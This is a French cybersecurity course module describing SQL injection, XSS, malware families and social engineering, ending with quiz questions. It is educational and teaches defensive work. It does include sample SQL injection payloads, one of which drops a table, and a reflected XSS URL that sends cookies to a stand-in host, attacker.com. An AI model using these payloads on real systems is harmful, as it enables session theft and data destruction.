# Types de cyberattaques

Connaître les techniques d'attaque est essentiel pour savoir se défendre. Ce module couvre les attaques les plus répandues et les plus dangereuses.

## Injections : le n° 1 de l'OWASP

Les attaques par injection se produisent lorsque des données non validées sont envoyées à un interpréteur (SQL, shell, LDAP). La plus connue est l'injection SQL.

### Injection SQL

Une requête vulnérable construit du SQL dynamiquement à partir de données utilisateur non validées.

```sql
-- Requête vulnérable (PHP)
SELECT * FROM users WHERE username = '$_GET[user]'

-- Charge malveillante
username = ' OR '1'='1
-- Résultat : renvoie TOUS les utilisateurs

-- Charge destructrice
username = '; DROP TABLE users; --
```

### Défense : les requêtes préparées

La seule défense efficace consiste à ne jamais concaténer de données utilisateur dans une requête SQL.

```php
// PHP PDO — requête préparée
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
// Le paramètre est traité comme une DONNÉE, jamais comme du SQL
```

### Autres types d'injection

- **Injection de commandes** : injecter des commandes shell via des formulaires
- **Injection LDAP** : manipuler les requêtes d'annuaire
- **Injection XPath** : cibler les bases de données XML

---

## XSS : Cross-Site Scripting

Le XSS permet d'injecter du JavaScript malveillant dans une page web consultée par d'autres utilisateurs. C'est le principal vecteur de vol de session et d'hameçonnage.

### XSS réfléchi

Le script malveillant est inclus dans l'URL et s'exécute immédiatement.

```html
https://site.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### XSS stocké (persistant)

Le script est enregistré dans la base de données et s'exécute pour chaque visiteur. Le type le plus dangereux.

### Défenses contre le XSS

```javascript
// ✅ Sûr — textContent encode automatiquement
element.textContent = userInput;

// ❌ Dangereux — innerHTML exécute les scripts
element.innerHTML = userInput;
```

En-têtes HTTP de protection :

```
Content-Security-Policy: default-src 'self'; script-src 'self'
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## Logiciels malveillants : une taxonomie complète

### Rançongiciel

Chiffre les fichiers de la victime et exige une rançon en échange de la clé de déchiffrement. Exemples : WannaCry (2017), LockBit, REvil. Vecteurs principaux : hameçonnage, RDP exposé, vulnérabilités non corrigées.

### RAT : Remote Access Trojan

Donne à l'attaquant un contrôle total à distance de la machine : enregistreur de frappe, captures d'écran, accès à la webcam. Exemples : NjRAT, AsyncRAT, DarkComet.

### Ver

Se propage automatiquement sur un réseau sans intervention humaine, en exploitant des vulnérabilités réseau. Exemples : Conficker ; WannaCry s'est propagé via EternalBlue.

### Rootkit

Se cache au niveau du système d'exploitation ou du noyau, ce qui rend la détection extrêmement difficile pour les antivirus ordinaires.

### Botnet

Un réseau de machines infectées contrôlées par un serveur C2 (Command and Control). Utilisé pour des attaques DDoS distribuées, l'envoi de spam et le minage de cryptomonnaies.

---

## Ingénierie sociale

La plupart des attaques réussies comportent une part d'ingénierie sociale. L'humain reste le maillon le plus faible.

### Hameçonnage (phishing)

Un e-mail frauduleux imitant une organisation de confiance pour voler des identifiants ou installer un logiciel malveillant. Envoyé en masse.

### Hameçonnage ciblé (spear phishing)

Une version ciblée et personnalisée du hameçonnage. L'attaquant se renseigne sur la victime pour rendre l'e-mail crédible. Son taux de réussite est bien plus élevé.

### Vishing et smishing

Les mêmes techniques par téléphone (vishing) ou par SMS (smishing). De plus en plus utilisées pour contourner les filtres de messagerie.

### Prétexte (pretexting)

L'attaquant crée un scénario fictif crédible pour manipuler la victime. Exemple : se faire passer pour le support technique.

### Se protéger de l'ingénierie sociale

La sensibilisation et la formation des utilisateurs sont les meilleures défenses :

- Vérifiez systématiquement l'identité de la personne qui vous contacte
- Ne cliquez jamais sur les liens d'e-mails urgents
- Appelez directement l'organisation pour vérifier
- Activez la MFA sur tous les comptes critiques

---

## Quiz : les attaques

```quiz
Quelle est la défense la plus efficace contre l'injection SQL ?
- [ ] Supprimer les guillemets des saisies utilisateur
- [x] Les requêtes préparées avec paramètres liés
- [ ] Masquer les messages d'erreur
> Avec les requêtes préparées, la saisie utilisateur est toujours traitée comme une donnée et jamais comme du SQL.
```

```quiz
Un commentaire contenant un script est enregistré dans la base de données et s'exécute dans le navigateur de chaque visiteur. De quelle attaque s'agit-il ?
- [ ] Un XSS réfléchi
- [x] Un XSS stocké
- [ ] Une CSRF
> La charge est stockée sur le serveur et servie à tout le monde, ce qui fait du XSS stocké la variante la plus dangereuse.
```

```quiz
Quel logiciel malveillant se propage automatiquement sur un réseau sans action humaine ?
- [ ] Un rootkit
- [ ] Un RAT
- [x] Un ver
> Un ver exploite des vulnérabilités réseau pour se copier de machine en machine, comme l'a fait WannaCry.
```
